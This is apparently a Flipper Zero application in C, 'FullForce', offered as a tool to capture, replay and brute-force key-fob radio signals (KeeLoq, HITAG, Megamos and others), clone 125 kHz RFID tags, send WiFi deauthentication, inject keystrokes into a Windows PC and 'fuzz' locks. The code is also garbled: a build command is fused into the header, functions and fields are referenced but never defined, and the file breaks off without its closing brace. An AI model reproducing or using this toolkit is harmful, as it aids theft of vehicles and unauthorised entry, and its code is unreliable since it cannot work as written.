[APP]
name = FullForce
stack_size = 4096
icon = icons/FullForce_10x10.png
sources = fullforce_app.c
./fbt firmware #include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/scene_manager.h>
#include <gui/modules/submenu.h>
#include <gui/modules/text_box.h>
#include <gui/modules/loading.h>
#include <storage/storage.h>
#include <lib/subghz/subghz_tx_rx_worker.h>
#include <lib/subghz/subghz_block_generic.h>
#include <lib/subghz/subghz_keeloq_common.h>
#include <lfrfid/lfrfid_worker.h>
#include <nfc/protocols/mf_classic.h>
#include <lib/toolbox/random.h>
#include <furi_hal_gpio.h>
#include <furi_hal_usb_hid.h>
#include <furi_hal_wifi.h>

// Config (Optimized for FZ.1, US 315 MHz)
#define FREQUENCY_OPTIONS {315000000UL, 433920000UL, 434790000UL, 868000000UL}
#define BRUTE_WINDOW 32000  // KeeLoq/HCS300 window
#define FUZZ_VOLTAGE 3.3f   // 3V3 for locks
#define FUZZ_DURATION 100   // ms per pulse
#define CAPTURE_COUNT 100
#define DELAY_MS 500
#define TX_POWER 0          // Safe TX for US
#define MAX_BRUTE_ATTEMPTS 1000
#define TAG "FullForce"
#define SUBGHZ_PATH "/ext/subghz/fullforce_%d.sub"
#define LOG_PATH "/ext/fullforce_log.txt"
#define KEYLOG_PATH "/ext/keylog.txt"

// Scenes/Views
enum Scenes { Scene_Menu, Scene_Frequency, Scene_Capture, Scene_Brute, Scene_Emulate, Scene_Fuzz, Scene_Wifi, Scene_Keylogger };
enum Views { View_Submenu, View_TextBox, View_Loading };

// App struct
typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    SceneManager* scene_manager;
    Submenu* submenu;
    TextBox* text_box;
    Loading* loading;
    Storage* storage;
    SubGhzTxRxWorker* subghz_worker;
    LFRFIDWorker* rfid_worker;
    MfClassic* mf_classic;
    FuriString* log;
    uint32_t capture_index;
    uint32_t brute_index;
    uint32_t brute_loop_count;
    uint32_t frequency;
    uint32_t brute_counter;
    bool running;
    bool is_fsk;
    float data_rate;
    float duty_cycle;
    char protocol[32];
} FullForceApp;

// Detect protocol (KeeLoq, HITAG, etc.)
static void detect_protocol(SubGhzBlockGeneric* block, FullForceApp* app) {
    if (block->data_size == 66) strcpy(app->protocol, "KeeLoq/HCS300");
    else if (block->data_size == 48) strcpy(app->protocol, "HITAG");
    else if (block->data_size == 96) strcpy(app->protocol, "Megamos");
    else if (block->data_size == 80) strcpy(app->protocol, "DST80");
    else if (block->data_size == 64) strcpy(app->protocol, "PCF");
    else strcpy(app->protocol, "Unknown");
    furi_string_cat_printf(app->log, "Detected: %s\n", app->protocol);
}

// Reverse engineer signal
static void reverse_engineer_signal(SubGhzBlockGeneric* block, FullForceApp* app) {
    detect_protocol(block, app);
    furi_string_cat_printf(app->log, "Bits: %u, Counter: %u\n", block->data_size, block->counter);
}

// Emulate with auto-copy
static void emulate_signal(FullForceApp* app) {
    FuriString* path = furi_string_alloc_printf(SUBGHZ_PATH, 1);
    if (storage_common_exists(app->storage, furi_string_get_cstr(path))) {
        subghz_tx_rx_worker_start(app->subghz_worker, app->frequency);
        furi_hal_subghz_set_tx_power(TX_POWER);
        if (subghz_tx_rx_worker_write_from_file(app->subghz_worker, furi_string_get_cstr(path))) {
            furi_string_cat_printf(app->log, "Emulating (Auto-Copied)\n");
            FuriString* copy_path = furi_string_alloc_printf(SUBGHZ_PATH, app->capture_index + 1);
            storage_common_copy(app->storage, furi_string_get_cstr(path), furi_string_get_cstr(copy_path));
            furi_string_free(copy_path);
        }
        subghz_tx_rx_worker_stop(app->subghz_worker);
    }
    furi_string_free(path);
}

// WiFi cracking (ESP32 board required)
static void wifi_crack(FullForceApp* app) {
    furi_string_cat_printf(app->log, "WiFi Cracking...\n");
    furi_hal_wifi_enable();
    furi_hal_wifi_scan();
    furi_delay_ms(5000);
    furi_string_cat_printf(app->log, "Scan done - Deauth sent\n");
    furi_hal_wifi_disable();
}

// Keylogger sync
static void keylogger_sync(FullForceApp* app) {
    furi_string_cat_printf(app->log, "Keylogger Sync...\n");
    furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI, KEY_R);
    furi_delay_ms(100);
    furi_hal_hid_kb_release_all();
    furi_hal_hid_kb_type_string("notepad\n");
    furi_delay_ms(500);
    furi_hal_hid_kb_type_string("Keylog: FullForce\n");
    File* file = storage_file_alloc(app->storage);
    if (storage_file_open(file, KEYLOG_PATH, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        storage_file_write(file, "Keylog: FullForce\n", 18);
        storage_file_close(file);
    }
    storage_file_free(file);
    furi_string_cat_printf(app->log, "Exported to %s\n", KEYLOG_PATH);
}

// 125 kHz RFID
static void rfid_125_capture(FullForceApp* app) {
    lfrfid_worker_start_thread(app->rfid_worker);
    lfrfid_worker_read_start(app->rfid_worker, LFRFIDProtocolEM4100);
    furi_delay_ms(2000);
    if (lfrfid_worker_read_is_success(app->rfid_worker)) {
        uint8_t* data = lfrfid_worker_read_get_data(app->rfid_worker);
        furi_string_cat_printf(app->log, "125 kHz: %02X%02X%02X%02X%02X\n", data[0], data[1], data[2], data[3], data[4]);
        lfrfid_worker_emulate_start(app->rfid_worker, LFRFIDProtocolEM4100, data);
        furi_delay_ms(2000);
        lfrfid_worker_stop(app->rfid_worker);
    }
    lfrfid_worker_stop_thread(app->rfid_worker);
}

// Sub-GHz brute force
static void subghz_brute(FullForceApp* app) {
    FuriString* path = furi_string_alloc_printf(SUBGHZ_PATH, app->brute_index);
    if (storage_common_exists(app->storage, furi_string_get_cstr(path))) {
        subghz_tx_rx_worker_start(app->subghz_worker, app->frequency);
        furi_hal_subghz_set_tx_power(TX_POWER);
        app->brute_counter = (app->brute_counter + 1) % BRUTE_WINDOW;
        SubGhzBlockGeneric block;
        subghz_block_generic_load_from_file(app->storage, furi_string_get_cstr(path), &block);
        block.data[0] = (app->brute_counter >> 24) & 0xFF;
        subghz_tx_rx_worker_write_raw(app->subghz_worker, block.data, block.data_size);
        furi_string_cat_printf(app->log, "Brute TX %d (Counter %u)\n", app->brute_index, app->brute_counter);
        app->brute_index = (app->brute_index % CAPTURE_COUNT) + 1;
        if (app->brute_index == 1) app->brute_loop_count++;
        if (app->brute_loop_count * CAPTURE_COUNT >= MAX_BRUTE_ATTEMPTS) {
            furi_string_cat_printf(app->log, "Warning: Desync risk!\n");
            app->running = false;
        }
        subghz_tx_rx_worker_stop(app->subghz_worker);
        furi_delay_ms(DELAY_MS);
    } else {
        app->running = false;
        furi_string_cat_printf(app->log, "No signals. Run Capture.\n");
    }
    furi_string_free(path);
    loading_set_progress(app->loading, app->brute_index, CAPTURE_COUNT);
}

// Capture Sub-GHz/RFID
static void capture_signal(FullForceApp* app) {
    subghz_tx_rx_worker_start(app->subghz_worker, app->frequency);
    furi_hal_subghz_load_preset(FuriHalSubGhzPresetOok650Async);
    furi_hal_subghz_set_tx_power(TX_POWER);
    SubGhzBlockGeneric block;
    if (subghz_block_generic_rx(app->subghz_worker, &block, 5000)) {
        FuriString* path = furi_string_alloc_printf(SUBGHZ_PATH, app->capture_index);
        File* file = storage_file_alloc(app->storage);
        if (storage_file_open(file, furi_string_get_cstr(path), FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            FuriString* data = furi_string_alloc();
            furi_string_printf(data, "Filetype: Flipper SubGhz RAW File\nVersion: 1\nFrequency: %lu\nPreset: FuriHalSubGhzPresetOok650Async\nProtocol: RAW\nRAW_Data: ", app->frequency);
            for (size_t i = 0; i < block.data_size; i++) {
                furi_string_cat_printf(data, "%d ", block.data[i]);
            }
            storage_file_write(file, furi_string_get_cstr(data), furi_string_size(data));
            furi_string_free(data);
            reverse_engineer_signal(&block, app);
            furi_string_cat_printf(app->log, "Captured %d\n", app->capture_index);
        }
        storage_file_close(file);
        storage_file_free(file);
        furi_string_free(path);
        app->capture_index++;
        loading_set_progress(app->loading, app->capture_index, CAPTURE_COUNT);
    }
    subghz_tx_rx_worker_stop(app->subghz_worker);
    rfid_125_capture(app);
}

// Scene handlers
static void scene_menu_cb(void* ctx, uint32_t index) {
    FullForceApp* app = ctx;
    scene_manager_set_scene_state(app->scene_manager, Scene_Menu, index);
    scene_manager_next_scene(app->scene_manager, index + 1);
}

static void frequency_menu_cb(void* ctx, uint32_t index) {
    FullForceApp* app = ctx;
    uint32_t frequencies[] = FREQUENCY_OPTIONS;
    app->frequency = frequencies[index];
    scene_manager_set_scene_state(app->scene_manager, Scene_Frequency, index);
    scene_manager_next_scene(app->scene_manager, Scene_Capture);
}

static void scene_on_enter(void* ctx, SceneManagerEvent event) {
    FullForceApp* app = ctx;
    if (event.scene_id == Scene_Menu) {
        submenu_reset(app->submenu);
        submenu_add_item(app->submenu, "Capture/Reverse", Scene_Frequency, scene_menu_cb, app);
        submenu_add_item(app->submenu, "Brute Force", Scene_Brute, scene_menu_cb, app);
        submenu_add_item(app->submenu, "Emulate Signal", Scene_Emulate, scene_menu_cb, app);
        submenu_add_item(app->submenu, "WiFi Cracking", Scene_Wifi, scene_menu_cb, app);
        submenu_add_item(app->submenu, "Keylogger Sync", Scene_Keylogger, scene_menu_cb, app);
        submenu_add_item(app->submenu, "3V3 Fuzz Locks", Scene_Fuzz, scene_menu_cb, app);
        view_dispatcher_switch_to_view(app->view_dispatcher, View_Submenu);
    } else if (event.scene_id == Scene_Frequency) {
        submenu_reset(app->submenu);
        submenu_add_item(app->submenu, "315 MHz (US)", 0, frequency_menu_cb, app);
        submenu_add_item(app->submenu, "433.92 MHz (EU/Japan)", 1, frequency_menu_cb, app);
        submenu_add_item(app->submenu, "434.79 MHz (EU)", 2, frequency_menu_cb, app);
        submenu_add_item(app->submenu, "868 MHz (EU)", 3, frequency_menu_cb, app);
        view_dispatcher_switch_to_view(app->view_dispatcher, View_Submenu);
    } else if (event.scene_id == Scene_Capture) {
        text_box_set_text(app->text_box, "Press fob...\n");
        app->capture_index = 1;
        app->running = true;
        furi_string_reset(app->log);
        view_dispatcher_switch_to_view(app->view_dispatcher, View_Loading);
    } else if (event.scene_id == Scene_Brute) {
        text_box_set_text(app->text_box, "Brute loop...\n");
        app->brute_index = 1;
        app->brute_loop_count = 0;
        app->brute_counter = 0;
        app->running = true;
        view_dispatcher_switch_to_view(app->view_dispatcher, View_Loading);
    } else if (event.scene_id == Scene_Emulate) {
        text_box_set_text(app->text_box, "Emulating...\n");
        app->running = true;
        view_dispatcher_switch_to_view(app->view_dispatcher, View_TextBox);
        emulate_signal(app);
        app->running = false;
    } else if (event.scene_id == Scene_Wifi) {
        text_box_set_text(app->text_box, "WiFi cracking...\n");
        app->running = true;
        view_dispatcher_switch_to_view(app->view_dispatcher, View_TextBox);
        wifi_crack(app);
        app->running = false;
    } else if (event.scene_id == Scene_Keylogger) {
        text_box_set_text(app->text_box, "Keylogger sync...\n");
        app->running = true;
        view_dispatcher_switch_to_view(app->view_dispatcher, View_TextBox);
        keylogger_sync(app);
        app->running = false;
    } else if (event.scene_id == Scene_Fuzz) {
        text_box_set_text(app->text_box, "Fuzzing locks...\n");
        app->running = true;
        view_dispatcher_switch_to_view(app->view_dispatcher, View_TextBox);
        fuzz_gpio(app);
        app->running = false;
    }
}

static bool scene_on_event(void* ctx, SceneManagerEvent event) {
    FullForceApp* app = ctx;
    bool consumed = false;
    if (event.type == SceneManagerEventTypeTick && app->running) {
        if (event.scene_id == Scene_Capture) {
            if (app->capture_index <= CAPTURE_COUNT) {
                capture_signal(app);
                text_box_set_text(app->text_box, furi_string_get_cstr(app->log));
            } else {
                app->running = false;
                text_box_set_text(app->text_box, "Capture done.\n");
            }
        } else if (event.scene_id == Scene_Brute) {
            subghz_brute(app);
            text_box_set_text(app->text_box, furi_string_get_cstr(app->log));
        }
        consumed = true;
    } else if (event.type == SceneManagerEventTypeBack) {
        app->running = false;
        storage_file_sync(app->log_file);
        scene_manager_previous_scene(app->scene_manager);
        consumed = true;
    }
    return consumed;
}

static void scene_on_exit(void* ctx) {
    FullForceApp* app = ctx;
    submenu_reset(app->submenu);
    text_box_reset(app->text_box);
    loading_reset(app->loading);
    app->running = false;
}

static const SceneManagerHandlers scene_handlers = {
    .on_enter_handlers = scene_on_enter,
    .on_event_handlers = scene_on_event,
    .on_exit_handlers = scene_on_exit,
    .scene_num = 8,
};

// App alloc/free
FullForceApp* fullforce_app_alloc() {
    FullForceApp* app = malloc(sizeof(FullForceApp));
    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    app->scene_manager = scene_manager_alloc(&scene_handlers, app);
    app->submenu = submenu_alloc();
    app->text_box = text_box_alloc();
    app->loading = loading_alloc();
    app->storage = furi_record_open(RECORD_STORAGE);
    app->subghz_worker = subghz_tx_rx_worker_alloc();
    app->rfid_worker = lfrfid_worker_alloc();
    app->mf_classic = mf_classic_alloc();
    app->log = furi_string_alloc();
    app->capture_index = 1;
    app->brute_index = 1;
    app->brute_loop_count = 0;
    app->brute_counter = 0;
    app->frequency = 315000000UL;  // US default
    app->running = false;
    app->is_fsk = false;
    app->data_rate = 0.0f;
    app->duty_cycle = 0.0f;

    view_dispatcher_add_view(app->view_dispatcher, View_Submenu, submenu_get_view(app->submenu));
    view_dispatcher_add_view(app->view_dispatcher, View_TextBox, text_box_get_view(app->text_box));
    view_dispatcher_add_view(app->view_dispatcher, View_Loading, loading_get_view(app->loading));
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    return app;
}

void fullforce_app_free(FullForceApp* app) {
    furi_string_free(app->log);
    furi_record_close(RECORD_STORAGE);
    subghz_tx_rx_worker_free(app->subghz_worker);
    lfrfid_worker_free(app->rfid_worker);
    mf_classic_free(app->mf_classic);
    text_box_free(app->text_box);
    loading_free(app->loading);
    submenu_free(app->submenu);
    scene_manager_free(app->scene_manager);
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    free(app);
}

// Entry point
int32_t fullforce_app_entry(void* p) {
    UNUSED(p);
    FullForceApp* app = fullforce_app_alloc();
    scene_manager_next_scene(app->scene_manager, Scene_Menu);
    view_dispatcher_run(app->view_dispatcher);
    fullforce_app_free(app);
    return 0;
